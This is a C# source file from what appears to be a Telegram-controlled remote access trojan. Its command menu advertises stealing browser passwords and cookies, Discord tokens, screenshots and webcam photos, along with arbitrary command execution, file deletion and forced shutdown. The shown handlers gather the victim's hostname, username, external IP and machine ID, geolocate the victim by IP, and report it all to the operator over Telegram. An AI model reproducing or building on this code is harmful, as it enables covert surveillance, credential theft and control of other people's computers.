using BotController1.Core;
using BotController1.Telegram;

namespace BotController1.Handlers;

public class SystemHandlers : HandlerBase
{
    public SystemHandlers(TelegramClient tg) : base(tg)
    {
    }

    private const string WelcomeText =
        "🤖 *Remote Control Bot Commands:*\n\n" +
        "📸 Media Commands:\n" +
        "/screen - Take a screenshot\n" +
        "/grabpic - Collect and send photos\n" +
        "/grabvideos - Collect and send videos\n" +
        "/webcam - Capture webcam photo\n" +
        "/webcam3 - Take 3 webcam photos\n\n" +
        "🔑 Browser Data Commands:\n" +
        "/passwords_chrome - Get Chrome passwords\n" +
        "/passwords_edge - Get Edge passwords\n" +
        "/passwords_brave - Get Brave passwords\n" +
        "/passwords_opera - Get Opera passwords\n" +
        "/cookies_chrome - Get Chrome cookies\n" +
        "/cookies_brave - Get Brave cookies\n" +
        "/cookies_edge - Get Edge cookies\n" +
        "/cookies_opera - Get Opera cookies\n" +
        "/get_discord - Get Discord token\n\n" +
        "💻 System Commands:\n" +
        "/info - System information\n" +
        "/location - Location from IP\n" +
        "/kill_process <name> - Kill process\n" +
        "/reboot - Reboot system\n" +
        "/shutdown - Shutdown system\n\n" +
        "🗂️ File Commands:\n" +
        "/pwd - Current directory\n" +
        "/ls - List files/folders\n" +
        "/cd <path> - Change directory\n" +
        "/download <file> - Download file\n" +
        "/rm_dir <path> - Delete folder\n\n" +
        "⚙️ Other Commands:\n" +
        "/cmd <command> - Run CMD command\n" +
        "/open_url <url> - Open URL\n" +
        "/stop - Stop running task\n" +
        "/status - Bot status\n\n" +
        "ℹ️ _Type /help to see this message again_";

    public void Welcome(TgMessage message)
    {
        if (!Authorize(message, logIncident: true))
            return;
        Tg.SendMessage(message.ChatId, WelcomeText, "Markdown");
    }

    public void Status(TgMessage message)
    {
        if (!Authorize(message))
            return;

        if (BotState.SystemInfoCache == null)
        {
            Tg.SendMessage(message.ChatId, "🔍 Gathering system information...");
            BotState.SystemInfoCache = SystemInfo.Collect();
        }

        var info = BotState.SystemInfoCache;
        var statusText =
            "💻 *System Information:*\n\n" +
            $"🖥️ OS: {info.Os ?? "Unknown"} {info.OsVersion ?? ""}\n" +
            $"🏠 Hostname: {info.Hostname ?? "Unknown"}\n" +
            $"👤 Username: {info.Username ?? "Unknown"}\n" +
            $"🌐 External IP: {info.ExternalIp ?? "Unknown"}\n" +
            $"🧠 CPU: {info.Cpu ?? "Unknown"}\n" +
            $"🧮 RAM: {info.TotalMemory ?? "Unknown"}\n" +
            $"🔢 Machine ID: {info.MachineGuid ?? "Unknown"}\n\n";

        if (BotState.IsRunning)
            statusText += $"⚙️ Currently running: {BotState.CurrentTask}\n";
        else
            statusText += "✅ Idle, awaiting commands.\n";

        Tg.SendMessage(message.ChatId, statusText, "Markdown");
    }

    public void Info(TgMessage message)
    {
        if (!Authorize(message))
            return;
        var info = SystemInfo.Collect();
        var infoMessage =
            $"🖥️ OS: {info.Os ?? "Unknown"} {info.OsVersion ?? ""}\n" +
            $"🏠 Hostname: {info.Hostname ?? "Unknown"}\n" +
            $"👤 Username: {info.Username ?? "Unknown"}\n" +
            $"🌐 External IP: {info.ExternalIp ?? "Unknown"}\n" +
            $"🧠 CPU: {info.Cpu ?? "Unknown"}\n" +
            $"🧮 RAM: {info.TotalMemory ?? "Unknown"}\n";
        Tg.SendMessage(message.ChatId, infoMessage);
    }

    private static string JsonVal(System.Text.Json.JsonElement el) => el.ValueKind switch
    {
        System.Text.Json.JsonValueKind.String => el.GetString(),
        System.Text.Json.JsonValueKind.Number => el.GetRawText(),
        _ => "Unknown",
    };

    public void Location(TgMessage message)
    {
        if (!Authorize(message))
            return;
        try
        {
            var externalIp = Net.GetString("https://api.ipify.org");
            using var geoDoc = System.Text.Json.JsonDocument.Parse(
                Net.GetString($"https://ipapi.co/{externalIp}/json/"));
            var geo = geoDoc.RootElement;
            if (!(geo.ValueKind == System.Text.Json.JsonValueKind.Object &&
                  geo.TryGetProperty("error", out _)))
            {
                var latitude = geo.TryGetProperty("latitude", out var lat) ? JsonVal(lat) : "Unknown";
                var longitude = geo.TryGetProperty("longitude", out var lon) ? JsonVal(lon) : "Unknown";
                Tg.SendMessage(message.ChatId,
                    $"📍 Location: https://www.google.com/maps?q={latitude},{longitude}");
            }
            else
            {
                Tg.SendMessage(message.ChatId, "❌ Failed to retrieve location.");
            }
        }
        catch (Exception e)
        {
            Tg.SendMessage(message.ChatId, $"❌ Error: {e.Message}");
        }
    }
}
